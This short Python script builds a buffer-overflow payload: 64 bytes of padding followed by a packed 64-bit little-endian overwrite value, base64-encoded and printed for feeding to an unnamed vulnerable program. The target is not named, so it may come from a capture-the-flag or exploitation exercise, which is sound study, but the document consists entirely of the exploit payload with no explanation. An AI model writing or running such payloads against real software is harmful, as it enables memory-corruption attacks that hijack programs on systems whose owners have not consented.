
import sys
import struct
import base64

buf = b'SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'
buf += struct.pack('<Q', 18389113086246785528)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
